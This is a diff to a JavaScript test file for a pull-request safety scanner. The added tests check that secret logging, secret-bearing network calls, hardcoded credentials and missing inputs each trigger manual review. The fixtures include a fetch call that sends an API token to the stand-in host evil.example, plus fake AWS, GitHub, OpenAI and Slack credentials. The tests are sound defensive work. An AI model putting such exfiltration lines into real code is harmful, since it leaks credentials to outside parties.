@@ -68,6 +68,7 @@ test('requires manual review when diff exposes secrets or tokens', () => {
   const result = assessPullRequestSafety({
     pr: pr(),
     diff: [
+      `+console.debug(${secretName});`,
       `+console.log(${secretName});`,
       `+fetch("https://evil.example", { headers: { Authorization: ${tokenName} } });`,
       '+env.CI_BOT_PAT = secrets.REVIEW_OPENAI_API_KEY;',
@@ -77,6 +78,17 @@ test('requires manual review when diff exposes secrets or tokens', () => {
   assert.equal(result.decision, 'manual_required');
   assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
   assert.ok(result.reason_codes.includes('sensitive_diff:secret_network'));
+});
+
+test('requires manual review when any console method exposes secrets', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+console.debug(${secretName});`,
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('sensitive_diff:secret_logging'));
 });
 
 test('allows trusted authors before scanning risky diff content', () => {
@@ -95,19 +107,30 @@ test('requires manual review for hardcoded secret values', () => {
   const githubToken = 'ghp_' + 'abcdefghijklmnopqrstuvwxyz0123456789AB';
   const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
   const bearerToken = 'abcdefghijklmnopqrstuvwxyz123456';
+  const genericSecret = 'abcdefghijklmnopqrstuvwx';
   const result = assessPullRequestSafety({
     pr: pr(),
     diff: [
+      '+-----BEGIN RSA PRIVATE KEY-----',
+      '+const awsAccessKey = "AKIAIOSFODNN7EXAMPLE";',
       `+const githubToken = "${githubToken}";`,
       `+const openaiKey = "${openaiKey}";`,
+      '+const slackToken = "xoxb-1234567890abcdefghij";',
       `+Authorization: Bearer ${bearerToken}`,
+      '+const callback = "https://example.test?access_token=abcdefghijklmnopqrstuvwxyz123456";',
+      `+const MY_API_KEY = "${genericSecret}";`,
     ].join('\n'),
   });
 
   assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('secret_value:private_key'));
+  assert.ok(result.reason_codes.includes('secret_value:aws_access_key'));
   assert.ok(result.reason_codes.includes('secret_value:github_token'));
   assert.ok(result.reason_codes.includes('secret_value:openai_key'));
+  assert.ok(result.reason_codes.includes('secret_value:slack_token'));
   assert.ok(result.reason_codes.includes('secret_value:bearer_token'));
+  assert.ok(result.reason_codes.includes('secret_value:access_token_param'));
+  assert.ok(result.reason_codes.includes('secret_value:assignment'));
 });
 
 test('requires manual review for hardcoded secret values in PR text', () => {
@@ -196,4 +219,14 @@ test('fails closed when diff is unavailable', () => {
   });
   assert.equal(missingDiff.decision, 'manual_required');
   assert.ok(missingDiff.reason_codes.includes('input:diff_unavailable'));
+});
+
+test('fails closed when head sha is missing', () => {
+  const result = assessPullRequestSafety({
+    pr: pr({ headRefOid: '' }),
+    diff: '+const copy = "Done";\n',
+  });
+
+  assert.equal(result.decision, 'manual_required');
+  assert.ok(result.reason_codes.includes('input:missing_head_sha'));
 });
